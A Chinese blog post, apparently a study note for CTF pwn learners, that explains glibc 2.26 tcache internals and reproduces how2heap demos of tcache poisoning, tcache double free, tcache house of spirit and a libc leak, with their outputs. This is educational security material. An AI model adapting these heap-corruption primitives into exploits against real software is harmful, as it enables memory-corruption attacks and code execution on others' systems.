@@ -1,0 +1,322 @@
+<!DOCTYPE html><html><head><title> tcache学习 &middot; Surager</title><!-- Begin Jekyll SEO tag v2.7.1 --><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="tcache学习" /><meta property="og:locale" content="en_US" /><meta name="description" content="glibc2.26新增" /><meta property="og:description" content="glibc2.26新增" /><link rel="canonical" href="http://localhost:4000/_posts/2020-03-16-tcache%E5%AD%A6%E4%B9%A0/" /><meta property="og:url" content="http://localhost:4000/_posts/2020-03-16-tcache%E5%AD%A6%E4%B9%A0/" /><meta property="og:site_name" content="Surager" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-03-16T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="tcache学习" /><meta name="google-site-verification" content="YIKi1rBnyUaS-DMYiluseI5kZzTwjCkTFmKkSkMZDJk" /><meta name="baidu-site-verification" content="szbTSfUGAB" /> <script type="application/ld+json"> {"url":"http://localhost:4000/_posts/2020-03-16-tcache%E5%AD%A6%E4%B9%A0/","headline":"tcache学习","datePublished":"2020-03-16T00:00:00+08:00","dateModified":"2020-03-16T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/_posts/2020-03-16-tcache%E5%AD%A6%E4%B9%A0/"},"description":"glibc2.26新增","@type":"BlogPosting","@context":"https://schema.org"}</script> <!-- End Jekyll SEO tag --><meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1" /><meta http-equiv="content-type" content="text/html; charset=utf-8" /><link rel="alternate" href="/feed.xml" title="Surager's blog" type="application/rss+xml" /><link rel="apple-touch-icon-precomposed" href="/static/assets/img/landing/avatar.jpg" /><link rel="shortcut icon" href="/static/assets/img/landing/avatar.jpg" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/gh/poole/lanyon@v1.1.0/public/css/poole.min.css,gh/poole/lanyon@v1.1.0/public/css/lanyon.min.css,gh/poole/lanyon@v1.1.0/public/css/syntax.min.css" /><link rel="stylesheet" href="/static/assets/script/admonitions.css" /> <script async="async" src="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/js/all.min.js" ></script> <script src='https://zz.bdstatic.com/linksubmit/push.js' async="async" ></script><style> .wrap { transition-property: width,background-size,transform; transition-duration: .3s; transition-timing-function: ease-in-out; min-height: 100%; display: inline-block; background-size: 100% auto; background-position: 0% 0%; background-repeat: no-repeat; background-attachment: fixed; background-image: url(/assets/image/74559485_p1.webp); } @media (min-aspect-ratio: 2400/1850) { .wrap { background-image: url(/assets/image/71932901_p0.webp); } } .sidebar-overlay #sidebar-checkbox:checked ~ .wrap { width: calc(100% - 14rem); background-size: calc(100% - 14rem) auto; transform: translateX(14rem); } .layout-reverse.sidebar-overlay #sidebar-checkbox:checked ~ .wrap { transform: translateX(0); }</style><style> .sidebar, html, h1, h2, h3, h4, h5, h6 { font-family: "Fira Code", Consolas, PingFang SC, Menlo, Monaco, "Courier New", Microsoft JhengHei, monospace; }</style><style> h1, h2, h3, h4, h5, h6 { font-weight: bold; }</style><style> .post h1, .post h2, .post h3, .post h4, .post h5, .post h6 { font-weight: 550; }</style><style> img { display: inline-block; margin: 0; }</style><style> ::-webkit-scrollbar { width: 3px; height: 3px; } ::-webkit-scrollbar-thumb { background-image: linear-gradient(45deg, Cyan 0%, Magenta 50%, Yellow 100%); }</style><style> ::selection { color: White; background: Black; }</style><body class="theme-base-07 sidebar-overlay"> <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular styles, `#sidebar-checkbox` for behavior. --> <input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox" /> <!-- Toggleable sidebar --><div class="sidebar" id="sidebar"><div class="sidebar-item"><div class="effect effect-right_to_left"> <img class="effect-img" src="/static/assets/img/landing/avatar.jpg" alt="img" /><div class="effect-info"> 19计算机专业在读<br/> Blue-Whale<br/> V&N<br/> 龙鸣PWN手<br/> 希望你能在这里学到东西<br/> <a href="mailto:surager2019@gmail.com"> <i class="fas fa-envelope"></i> </a> <a href="https://github.com/Surager"> <i class="fab fa-github"></i> </a> <a href="https://surager.pub/feed.xml"> <i class="fas fa-rss"></i> </a> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=100% height=52 src="https://music.163.com/outchain/player?type=2&id=1453894413&auto=0&height=32" ></iframe></div></div></div><nav class="sidebar-nav"> <a class="sidebar-nav-item" href="/"> <i class="fas fa-home fa-fw"></i> 首页 </a> <a class="sidebar-nav-item" href="/comments/"> <i class="fas fa-comments fa-fw"></i> 留言 </a> <a class="sidebar-nav-item" href="/tags/"> <i class="fas fa-tags fa-fw"></i> 标签 </a> <a class="sidebar-nav-item" href="/archive/"> <i class="fas fa-archive fa-fw"></i> 归档 </a> <a class="sidebar-nav-item" href="/about/"> <i class="fas fa-address-card fa-fw"></i> 关于 </a></nav><div class="sidebar-item"><style> #sidebar-search-input { background: none; border: none; color: White; width: 100%; } #sidebar-search-results-container { overflow: auto auto; max-height: 66.6vh; }</style><input id="sidebar-search-input" placeholder="搜索博文" /><ol id="sidebar-search-results-container" ></ol><script src='https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.11/dest/simple-jekyll-search.min.js' async='async' onload=' SimpleJekyllSearch({ json: "/assets/simple-jekyll-search/search.json", searchInput: document.getElementById("sidebar-search-input"), resultsContainer: document.getElementById("sidebar-search-results-container"), searchResultTemplate: `<li><a href="{url}">{title}</a>`, limit: 999, fuzzy: true })' ></script><style> #toc { overflow: auto auto; max-height: 66.6vh; }</style><ol id="toc"><li><a href="#glibc226%E6%96%B0%E5%A2%9E">glibc2.26新增</a><ol><li><a href="#%E5%AE%8F%E5%AE%9A%E4%B9%89">宏定义</a><li><a href="#%E4%B8%A4%E4%B8%AA%E7%BB%93%E6%9E%84%E4%BD%93">两个结构体</a><li><a href="#%E4%B8%A4%E4%B8%AA%E9%87%8D%E8%A6%81%E5%87%BD%E6%95%B0">两个重要函数</a><li><a href="#%E5%87%A0%E4%B8%AAmalloc%E5%92%8Cfree%E6%96%B0%E5%A2%9E">几个malloc和free新增</a></ol><li><a href="#%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8">几个简单利用</a><ol><li><a href="#tcache_poisoning">tcache_poisoning</a><li><a href="#tcache_dup">tcache_dup</a><li><a href="#tcache_house_of_spirit">tcache_house_of_spirit</a><li><a href="#libc-leak">libc leak</a></ol></ol><style> .sidebar-checkbox { display: none; } .sidebar-toggle { position: fixed; }</style><style> .sidebar { overflow: scroll; min-height: 101%; }</style><style> .effect { margin: 1rem; perspective: 900px; } .effect-info { text-align: center; backface-visibility: hidden; position: absolute; top: 0; transform-style: preserve-3d; } .effect-img { z-index: 11; width: 100%; height: 100%; position: relative; transition: all 0.5s ease-in-out; } .effect-img:before { position: absolute; display: block; } .effect-right_to_left .effect-img { transform-origin: 0% 50%; } .effect-right_to_left:hover .effect-img { transform: rotate3d(0, 1, 0, -180deg); }</style><div> <i class="fas fa-cog fa-spin fa-fw"></i> <span id="run_time_day"> <i class="fas fa-spinner fa-pulse"></i> </span>天 <span id="run_time_hour"> <i class="fas fa-spinner fa-pulse"></i> </span>时 <span id="run_time_minute"> <i class="fas fa-spinner fa-pulse"></i> </span>分 <span id="run_time_second"> <i class="fas fa-spinner fa-pulse"></i> </span>秒 <script> setInterval(function (d,h,m,s,b) { function setzero(i) { return i < 10 ? "0" + i : i; } let BirthDay = new Date(b); let today = new Date(); let timeold = (today.getTime() - BirthDay.getTime()); let sectimeold = timeold / 1000; let secondsold = Math.floor(sectimeold); let msPerDay = 24 * 60 * 60 * 1000; let e_daysold = timeold / msPerDay; let daysold = Math.floor(e_daysold); let e_hrsold = (e_daysold - daysold) * 24; let hrsold = Math.floor(e_hrsold); let e_minsold = (e_hrsold - hrsold) * 60; let minsold = Math.floor((e_hrsold - hrsold) * 60); let seconds = Math.floor((e_minsold - minsold) * 60); d.textContent = daysold; h.textContent = setzero(hrsold); m.textContent = setzero(minsold); s.textContent = setzero(seconds); }, 1000, document.getElementById("run_time_day"), document.getElementById("run_time_hour"), document.getElementById("run_time_minute"), document.getElementById("run_time_second"), "10/27/2019 00:00:00")// 这是我第一篇CSDN博客的时间 </script></div><div><div> <i class="fas fa-eye fa-fw"></i> <span id="busuanzi_value_page_pv"> <i class="fas fa-spinner fa-pulse"></i> </span>次</div><div> <i class="fas fa-paw fa-fw"></i> <span id="busuanzi_value_site_pv"> <i class="fas fa-spinner fa-pulse"></i> </span>枚</div><div> <i class="fas fa-user-friends fa-fw"></i> <span id="busuanzi_value_site_uv"> <i class="fas fa-spinner fa-pulse"></i> </span>人</div><script src='https://cdn.jsdelivr.net/npm/busuanzi@2.3.0' async='async' ></script></div><div> <i class="fas fa-thumbs-up fa-fw"></i> <a href="https://jekyll-theme-WuK.wu-kan.cn"> jekyll-theme-WuK </a></div><div> <i class="fa fa-users fa-fw"></i> <a href="https://aidaip.github.io"> AiDai </a></div><div> <i class="fa fa-users fa-fw"></i> <a href="https://coinc1dens.github.io/"> Coin哥哥 </a></div><div> <i class="fa fa-users fa-fw"></i> <a href="https://www.freejishu.com/"> freejishu的美丽世界 </a></div><div> <i class="fa fa-users fa-fw"></i> <a href="https://hitcxy.com"> pikachu's Blog </a></div><div> <i class="fa fa-users fa-fw"></i> <a href="https://n0vice.gitee.io/"> N0vice </a></div><div> <i class="fa fa-users fa-fw"></i> <a href="https://phuker.github.io/"> 腾汛新闻 </a></div><div> <i class="fas fa-copyright fa-fw"></i> 2019-2021 Surager</div></div></div><!-- Wrap is the content to shift when toggling the sidebar. We wrap the content to avoid any CSS collisions with our real content. --><div class="wrap"><style> pre { max-height: 66.6vh; overflow: auto; }</style><style> .container { min-width: 66.6%; }</style><style> .container.content { padding-top: 1rem; padding-bottom: 1px; margin-top: 1.5rem; margin-bottom: 1.5rem; border-radius:10px; box-shadow:0px 0px 0px 3px #bb0a0a, 0px 0px 0px 6px #2e56bf, 0px 0px 0px 9px #ea982e; background-color: rgba(255,255,255,0.95); animation-duration: 2s; animation-name: fadeIn; } .masthead{ padding-top: 1rem; padding-bottom: 1rem; margin-bottom: 1.5rem; box-shadow: 0 0 5rem rgba(0, 0, 0, 0.1); background-color: rgba(255,255,255,0.99); animation-duration: 2s; animation-name: fadeIn; } @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }</style><div class="container content"><div class="page"><div class="post"> <span class="post-date"> <i class="fas fa-calendar-day fa-fw"></i> Time: 2020-03-16 <i class="fas fa-tag fa-fw"></i> Tags: binary <br/> <i class="fas fa-link fa-fw"></i> Link: <a href="/_posts/2020-03-16-tcache%E5%AD%A6%E4%B9%A0/"> tcache学习 </a> </span><h2 id="glibc226新增">glibc2.26新增</h2><h3 id="宏定义">宏定义</h3><pre><code class="language-c">#if USE_TCACHE
+/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */
+# define TCACHE_MAX_BINS                64
+# define MAX_TCACHE_SIZE        tidx2usize (TCACHE_MAX_BINS-1)
+/* Only used to pre-fill the tunables.  */
+# define tidx2usize(idx)        (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)
+/* When "x" is from chunksize().  */
+# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
+/* When "x" is a user-provided size.  */
+# define usize2tidx(x) csize2tidx (request2size (x))
+/* With rounding and alignment, the bins are...
+   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)
+   idx 1   bytes 25..40 or 13..20
+   idx 2   bytes 41..56 or 21..28
+   etc.  */
+/* This is another arbitrary limit, which tunables can change.  Each
+   tcache bin will hold at most this number of chunks.  */
+# define TCACHE_FILL_COUNT 7
+#endif
+</code></pre><p>tcache的最大bins个数为64，每个bins最多放7个chunk。</p><h3 id="两个结构体">两个结构体</h3><pre><code class="language-c">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+} tcache_entry;
+
+/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */
+typedef struct tcache_perthread_struct
+{
+  char counts[TCACHE_MAX_BINS];
+  tcache_entry *entries[TCACHE_MAX_BINS];
+} tcache_perthread_struct;
+
+static __thread tcache_perthread_struct *tcache = NULL;
+</code></pre><p>tcache_entry，单链表结构，只有一个next域。</p><p>tcache_perthread_struct，tcache的主体结构，包含64个entry，counts记录每个链上的chunk个数。</p><h3 id="两个重要函数">两个重要函数</h3><pre><code class="language-c">static void
+ tcache_put (mchunkptr chunk, size_t tc_idx)
+{
+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+  assert (tc_idx &lt; TCACHE_MAX_BINS);
+  e-&gt;next = tcache-&gt;entries[tc_idx];
+  tcache-&gt;entries[tc_idx] = e;
+  ++(tcache-&gt;counts[tc_idx]);
+}
+
+/* Caller must ensure that we know tc_idx is valid and there's
+   available chunks to remove.  */
+static void *
+tcache_get (size_t tc_idx)
+{
+  tcache_entry *e = tcache-&gt;entries[tc_idx];
+  assert (tc_idx &lt; TCACHE_MAX_BINS);
+  assert (tcache-&gt;entries[tc_idx] &gt; 0);
+  tcache-&gt;entries[tc_idx] = e-&gt;next;
+  --(tcache-&gt;counts[tc_idx]);
+  return (void *) e;
+}
+</code></pre><p>几乎没有什么检测，可以直接就饶过了。起初的tcache机制几乎完美地诠释了什么叫双刃剑，就是在赌今天咱两个人必须要死一个。</p><h3 id="几个malloc和free新增">几个malloc和free新增</h3><p>tcache初始化。</p><pre><code class="language-c">tcache_init(void)
+{
+  mstate ar_ptr;
+  void *victim = 0;
+  const size_t bytes = sizeof (tcache_perthread_struct);
+
+  if (tcache_shutting_down)
+    return;
+
+  arena_get (ar_ptr, bytes);
+  victim = _int_malloc (ar_ptr, bytes);
+  if (!victim &amp;&amp; ar_ptr != NULL)
+    {
+      ar_ptr = arena_get_retry (ar_ptr, bytes);
+      victim = _int_malloc (ar_ptr, bytes);
+    }
+
+
+  if (ar_ptr != NULL)
+    __libc_lock_unlock (ar_ptr-&gt;mutex);
+
+  /* In a low memory situation, we may not be able to allocate memory
+     - in which case, we just keep trying later.  However, we
+     typically do this very early, so either there is sufficient
+     memory, or there isn't enough memory to do non-trivial
+     allocations anyway.  */
+  if (victim)
+    {
+      tcache = (tcache_perthread_struct *) victim;
+      memset (tcache, 0, sizeof (tcache_perthread_struct));
+    }
+
+}
+</code></pre><p>_int_malloc中新增定义。</p><pre><code class="language-c">#if USE_TCACHE
+         /* While we're here, if we see other chunks of the same size,
+            stash them in the tcache.  */
+         size_t tc_idx = csize2tidx (nb);
+         if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
+           {
+             mchunkptr tc_victim;
+
+             /* While bin not empty and tcache not full, copy chunks over.  */
+             while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
+                    &amp;&amp; (pp = *fb) != NULL)
+               {
+                 REMOVE_FB (fb, tc_victim, pp);
+                 if (tc_victim != 0)
+                   {
+                     tcache_put (tc_victim, tc_idx);
+                   }
+               }
+           }
+#endif
+</code></pre><p>tcache_thread_freeres</p><pre><code class="language-c">static void __attribute__ ((section ("__libc_thread_freeres_fn")))
+tcache_thread_freeres (void)
+{
+  int i;
+  tcache_perthread_struct *tcache_tmp = tcache;
+
+  if (!tcache)
+    return;
+
+  tcache = NULL;
+
+  for (i = 0; i &lt; TCACHE_MAX_BINS; ++i)
+    {
+      while (tcache_tmp-&gt;entries[i])
+       {
+         tcache_entry *e = tcache_tmp-&gt;entries[i];
+         tcache_tmp-&gt;entries[i] = e-&gt;next;
+         __libc_free (e);
+       }
+    }
+
+  __libc_free (tcache_tmp);
+
+  tcache_shutting_down = 1;
+}
+</code></pre><p>清空此线程的tcache。</p><pre><code class="language-c">#if USE_TCACHE
+  {
+    size_t tc_idx = csize2tidx (size);
+
+    if (tcache
+       &amp;&amp; tc_idx &lt; mp_.tcache_bins
+       &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)
+      {
+       tcache_put (p, tc_idx);
+       return;
+      }
+  }
+#endif
+</code></pre><h2 id="几个简单利用">几个简单利用</h2><h3 id="tcache_poisoning">tcache_poisoning</h3><p>完全没有什么技术可言。改指针，改完malloc两次即可任意写。</p><p>how2heap tcache_poisoning.c:</p><pre><code class="language-c">1	#include &lt;stdio.h&gt;
+2	#include &lt;stdlib.h&gt;
+3	#include &lt;stdint.h&gt;
+4	
+5	int main()
+6	{
+7		fprintf(stderr, "This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
+8		       "returning a pointer to an arbitrary location (in this case, the stack).\n"
+9		       "The attack is very similar to fastbin corruption attack.\n\n");
+10	
+11		size_t stack_var;
+12		fprintf(stderr, "The address we want malloc() to return is %p.\n", (char *)&amp;stack_var);
+13	
+14		fprintf(stderr, "Allocating 1 buffer.\n");
+15		intptr_t *a = malloc(128);
+16		fprintf(stderr, "malloc(128): %p\n", a);
+17		fprintf(stderr, "Freeing the buffer...\n");
+18		free(a);
+19	
+20		fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
+21		fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
+22			"to point to the location to control (%p).\n", sizeof(intptr_t), a, &amp;stack_var);
+23		a[0] = (intptr_t)&amp;stack_var;
+24	
+25		fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
+26		fprintf(stderr, "Now the tcache list has [ %p ].\n", &amp;stack_var);
+27	
+28		intptr_t *b = malloc(128);
+29		fprintf(stderr, "2nd malloc(128): %p\n", b);
+30		fprintf(stderr, "We got the control\n");
+31	
+32		return 0;
+33	}
+</code></pre><p>程序定义了一个栈上的变量，然后malloc一个chunk后free，改变它的指针为栈上变量，malloc两次得到栈上的chunk。</p><p>运行结果：</p><pre><code class="language-shell">This file demonstrates a simple tcache poisoning attack by tricking malloc into
+returning a pointer to an arbitrary location (in this case, the stack).
+The attack is very similar to fastbin corruption attack.
+
+The address we want malloc() to return is 0x7ffefcc8e5e0.
+Allocating 1 buffer.
+malloc(128): 0x55798c6a3260
+Freeing the buffer...
+Now the tcache list has [ 0x55798c6a3260 ].
+We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55798c6a3260
+to point to the location to control (0x7ffefcc8e5e0).
+1st malloc(128): 0x55798c6a3260
+Now the tcache list has [ 0x7ffefcc8e5e0 ].
+2nd malloc(128): 0x7ffefcc8e5e0
+We got the control
+</code></pre><h3 id="tcache_dup">tcache_dup</h3><p>与fastbin相比，它少了一丝心机，多了一份单纯。犹如一丝细沙，拂过旅行者的脸。</p><p>how2heap tcache_dup.c:</p><pre><code class="language-c">1	#include &lt;stdio.h&gt;
+2	#include &lt;stdlib.h&gt;
+3	
+4	int main()
+5	{
+6		fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");
+7	
+8		fprintf(stderr, "Allocating buffer.\n");
+9		int *a = malloc(8);
+10	
+11		fprintf(stderr, "malloc(8): %p\n", a);
+12		fprintf(stderr, "Freeing twice...\n");
+13		free(a);
+14		free(a);
+15	
+16		fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
+17		fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
+18	
+19		return 0;
+20	}
+</code></pre><p>运行结果：</p><pre><code class="language-shell">This file demonstrates a simple double-free attack with tcache.
+Allocating buffer.
+malloc(8): 0x561e878e1260
+Freeing twice...
+Now the free list has [ 0x561e878e1260, 0x561e878e1260 ].
+Next allocated buffers will be same: [ 0x561e878e1260, 0x561e878e1260 ].
+</code></pre><h3 id="tcache_house_of_spirit">tcache_house_of_spirit</h3><p>在栈上伪造chunk，然后free掉，继而能malloc到栈上。</p><p>how2heap tcache_house_of_spirit.c:</p><pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main()
+{
+        fprintf(stderr, "This file demonstrates the house of spirit attack on tcache.\n");
+        fprintf(stderr, "It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
+        fprintf(stderr, "You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
+        fprintf(stderr, "(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");
+
+        fprintf(stderr, "Ok. Let's start with the example!.\n\n");
+
+
+        fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
+        malloc(1);
+
+        fprintf(stderr, "Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
+        unsigned long long *a; //pointer that will be overwritten
+        unsigned long long fake_chunks[10]; //fake chunk region
+
+        fprintf(stderr, "This region contains one fake chunk. It's size field is placed at %p\n", &amp;fake_chunks[1]);
+
+        fprintf(stderr, "This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
+        fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
+        fake_chunks[1] = 0x40; // this is the size
+
+
+        fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &amp;fake_chunks[1]);
+        fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
+
+        a = &amp;fake_chunks[2];
+
+        fprintf(stderr, "Freeing the overwritten pointer.\n");
+        free(a);
+
+        fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &amp;fake_chunks[1], &amp;fake_chunks[2]);
+        fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
+}
+</code></pre><p>运行结果：</p><pre><code class="language-shell">This file demonstrates the house of spirit attack on tcache.
+It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.
+You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.
+(Search for strings "invalid next size" and "double free or corruption")
+
+Ok. Let's start with the example!.
+
+Calling malloc() once so that it sets up its memory.
+Let's imagine we will overwrite 1 pointer to point to a fake chunk region.
+This region contains one fake chunk. It's size field is placed at 0x7ffe15f54808
+This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
+... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. 
+Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe15f54808.
+... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
+Freeing the overwritten pointer.
+Now the next malloc will return the region of our fake chunk at 0x7ffe15f54808, which will be 0x7ffe15f54810!
+malloc(0x30): 0x7ffe15f54810
+</code></pre><h3 id="libc-leak">libc leak</h3><p>以前的libc版本：</p><pre><code class="language-c">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+
+int main()
+{
+    long *a = malloc(0x1000);
+    malloc(0x10);
+    free(a);
+    printf("%p\n",a[0]);
+} 
+</code></pre><p>但在2.26之后，我们需要先把tcache填满，再free一个：</p><pre><code class="language-c">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc , char* argv[])
+{
+    long* t[7];
+    long *a=malloc(0x100);
+    long *b=malloc(0x10);
+
+    // make tcache bin full
+    for(int i=0;i&lt;7;i++)
+        t[i]=malloc(0x100);
+    for(int i=0;i&lt;7;i++)
+        free(t[i]);
+
+    free(a);
+    // a is put in an unsorted bin because the tcache bin of this size is full
+    printf("%p\n",a[0]);
+} 
+</code></pre><p>最后的free(a)会使得a进入到unsorted bins里面：</p><pre><code>pwndbg&gt; bins
+tcachebins
+0x110 [  7]: 0x6029f0 —▸ 0x6028e0 —▸ 0x6027d0 —▸ 0x6026c0 —▸ 0x6025b0 —▸ 0x6024a0 —▸ 0x602390 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x602250 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x602250 /* 'P"`' */
+smallbins
+empty
+largebins
+empty
+</code></pre><p>从而泄露libc。</p><aside class="admonition warning"><p><strong>warning</strong><br /> 在 libc2.31 加入 tcache double free 检测之后，libc2.27 也在 1.3 版本之后加入了 double free 检测，let’s say goodbye。</p></aside></div><div id="disqus_thread"></div><script> (function() { var d = document, s = d.createElement('script'); s.src = 'https://surager-pub.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> <script> (function($){ setInterval(() => { $.each($('iframe'), (arr,x) => { let src = $(x).attr('src'); if (src && src.match(/(ads-iframe)|(disqusads)/gi)) { $(x).remove(); } }); }, 300); })(jQuery); </script> <br/> <i class="fas fa-coffee fa-fw"></i> <a href="/comments/">如果这篇博客帮助到你，可以留言夸夸我~</a> <br/> <i class="fab fa-creative-commons-by fa-fw"></i> <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh" rel="license"> CC BY-NC 4.0 </a> （除特别声明或转载文章外）</div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" /><style> .katex-display>.katex { white-space: normal; }</style><script src="https://cdn.jsdelivr.net/combine/npm/katex@0.12.0/dist/katex.min.js,npm/katex@0.12.0/dist/contrib/auto-render.min.js" async="async" onload='renderMathInElement(document.body, { delimiters: [{left: "$$", right: "$$", display: true}, { left: "$", right: "$", display: false }, {left: "\\(", right: "\\)", display: false}, {left: "\\[", right: "\\]", display: true}]})' ></script><style> pre.language-mermaid, code.language-mermaid { display: none; } .mermaid { overflow: auto auto; max-width: 100%; max-height: 66.6vh; }</style><script src="https://cdn.jsdelivr.net/npm/mermaid@8.8.3/dist/mermaid.min.js" async="async" onload=' for(let x of document.getElementsByClassName("language-mermaid")) if(x.nodeName=="CODE") { let m = document.createElement("div"); m.classList.add("mermaid"); m.textContent = x.textContent; x.parentNode.insertAdjacentElement("beforebegin", m); }' ></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/prismjs@1.21.0/plugins/line-numbers/prism-line-numbers.min.css,npm/prismjs@1.21.0/plugins/toolbar/prism-toolbar.min.css,npm/prismjs@1.21.0/plugins/match-braces/prism-match-braces.min.css,npm/prism-themes@1.4.0/themes/prism-nord.min.css" /> <script src="https://cdn.jsdelivr.net/combine/npm/prismjs@1.21.0/components/prism-core.min.js,npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js,npm/prismjs@1.21.0/plugins/line-numbers/prism-line-numbers.min.js,npm/prismjs@1.21.0/plugins/toolbar/prism-toolbar.min.js,npm/prismjs@1.21.0/plugins/match-braces/prism-match-braces.min.js" async="async" data-autoloader-path="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/components/" onload=' for(let x of document.getElementsByClassName("content")) x.classList.add("line-numbers","match-braces"); Prism.plugins.toolbar.registerButton("select-code", function (env) { let button = document.createElement("button"); button.textContent = "select this " + env.language; button.addEventListener("click", function () { if (document.body.createTextRange) { let range = document.body.createTextRange(); range.moveToElementText(env.element); range.select(); } else if (window.getSelection) { let selection = window.getSelection(); let range = document.createRange(); range.selectNodeContents(env.element); selection.removeAllRanges(); selection.addRange(range); } }); return button; })' ></script></div><label for="sidebar-checkbox" class="sidebar-toggle"></label>
